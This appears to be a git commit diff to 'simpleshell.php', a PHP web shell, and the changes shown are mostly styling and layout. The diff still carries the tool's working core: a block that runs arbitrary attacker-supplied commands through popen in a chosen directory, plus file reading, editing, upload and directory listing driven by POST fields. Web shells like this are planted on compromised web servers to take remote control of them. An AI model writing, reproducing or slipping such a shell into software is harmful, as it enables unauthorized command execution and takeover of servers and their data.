355bf0534e4c5b25bf44064b6df2cb6153fd890e
rabbitx1337 <72482820+rabbitx1337@users.noreply.github.com>
2020-10-24 17:35:23 +0700

    Update simpleshell.php

--- simpleshell.php
+++ simpleshell.php
@@ -4,7 +4,7 @@ body,input {
 font-family: 'Ubuntu', sans-serif;
 }
 table {
-width:50%;
+width:70%;
 background: #fff;
 padding:15px;
 border-radius:10px;
@@ -14,6 +14,8 @@ table td {
 padding:5px;
 }
 div.label {
+font-size:20px;
+padding-left:5px;
 padding-top:5px;
 padding-bottom:5px;
 }
@@ -39,12 +41,33 @@ border: 1px solid #e7f3ff;
 color: #1889f5;
 font-weight: bold;
 }
+input[type=submit] {
+width:100%;
+padding:8px;
+border-radius:8px;
+background: #e7f3ff;
+outline: none;
+border: 1px solid #e7f3ff;
+color: #1889f5;
+font-weight: bold;
+}
+select {
+width:100%;
+padding:8px;
+border-radius:8px;
+border: 1px solid #ebebeb;
+background: #ebebeb;
+outline: none;
+}
+input[type=submit]:hover {
+cursor: pointer;
+}
 div.submit input[type=submit]:hover {
 cursor: pointer;
 }
 div.textarea textarea {
 width:100%;
-height:230px;
+height:380px;
 resize: none;
 border-radius:8px;
 outline: none;
@@ -75,7 +98,7 @@ if($_POST['king']=="")
 <table align="center">
 	<tr>
 		<th colspan="3">
-			<h2>Simple Shell</h2>
+			<h1>Simple Shell</h1>
 		</th>
 	</tr>
 	<?php
@@ -103,15 +126,15 @@ if($_POST['king']=="")
 				<tr>
 					<td colspan="3">
 						<div class="textarea">
-							<textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+							<textarea style="height:500px;" name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
 						</div>
 					</td>
 				</tr>
 				<tr>
-					<td>
-						<input type="submit" name="submit">
+					<td colspan="3">
+						<input type="submit" name="submit" value="Update">
 						<input type="hidden" name="file" value="<?= $_POST['file'] ?>">
-						<input type="hidden" name="edit">
+						<input type="hidden" name="edit" style="width: 100%;">
 					</td>
 				</tr>
 			</form>
@@ -147,12 +170,13 @@ if($_POST['king']=="")
 				</div>
 			</td>
 		</tr>
-		<tr><td colspan="2"></td></tr>
-			<tr><td colspan="2"></td></tr>
-			<tr><td colspan="2"></td></tr>
-			<tr><td colspan="2"></td></tr>
+		
 			<tr>
-				<td>Upload File</td>
+				<td>
+					<div class="label">
+						<span>Upload File</span>
+					</div>
+				</td>
 			</tr>
 			<tr>
 				<td>
@@ -177,7 +201,11 @@ if($_POST['king']=="")
 					}
 		?>
 		<tr>
-			<td>Edit</td>
+			<td>
+				<div class="label">
+					<span>Edit File</span>
+				</div>
+			</td>
 		</tr>
 		<form method="post">
 			<tr>
@@ -185,17 +213,20 @@ if($_POST['king']=="")
 					<select name="file">
 						<option disabled selected>Select File</option>
 						<?php
-						foreach (scandir(getcwd()) as $key => $value) {
-							$file = getcwd() . DIRECTORY_SEPARATOR . $value;
+						foreach (scandir($curdir) as $key => $value) {
+							$file = $curdir . DIRECTORY_SEPARATOR . $value;
 							if (is_file($file)) {
-								?> <option value="<?= $file ?>"><?= $value ?></option> <?php
+								?> <option value="<?= $file ?>"><u><?= $value ?></u></option> <?php
 							}
+						}
+						if (!count($curdir)) {
+							?> <option disabled>no files in this directory</option> <?php
 						}
 						?>
 					</select>
 				</td>
 				<td>
-					<input style="width:100%;" type="submit" name="edit">
+					<input style="width:100%;" type="submit" name="edit" value="Edit">
 				</td>
 			</tr>
 		</form>
@@ -203,21 +234,19 @@ if($_POST['king']=="")
 		<tr>
 			<td colspan="2">
 				<div class="textarea">
-					<textarea placeholder="result command"><?php 
-						if(($_POST['exe'])=="Execute")
-							{
-								$curcmd="cd ".$curdir.";".$curcmd;
-								$f=popen($curcmd,"r");
-								while(!feof($f))
-									{
-										$buffer=fgets($f,4096);
-										$string.=$buffer;
-									}
-									pclose($f);
-									echo htmlspecialchars($string);
-								}
-								?>
-					</textarea>
+					<pre>
+					<?php 
+					if(($_POST['exe'])=="Execute")
+						{$curcmd="cd ".$curdir.";".$curcmd;
+						$f=popen($curcmd,"r");
+						while(!feof($f)){
+							$buffer=fgets($f,4096);$string.=$buffer;
+						}
+						pclose($f);
+							echo htmlspecialchars($string);
+						}
+						?>
+					</pre>
 				</div>
 			</td>
 		</tr>
